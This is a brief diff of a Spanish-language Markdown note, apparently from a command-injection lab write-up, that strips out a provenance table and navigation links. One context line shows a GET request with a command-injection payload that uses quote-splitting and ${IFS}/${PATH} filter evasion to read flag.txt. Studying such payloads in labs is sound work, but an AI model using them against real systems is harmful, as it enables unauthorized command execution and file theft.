@@ -48,12 +48,3 @@ GET /index.php?to=tmp%26$()c'a't${IFS}${PATH:0:1}flag.txt&from=2561732172.txt&fi
 
 - [Exploitation](../../../Web-Security/Command-Injection/explotation.md)
 - [Filter Evasion](../../../Web-Security/Command-Injection/filter-evasion.md)
-
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | 10- Command Injections/3 - Skills Assessment.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-[Índice de categoría](../../README.md) · [Inicio](../../../README.md)
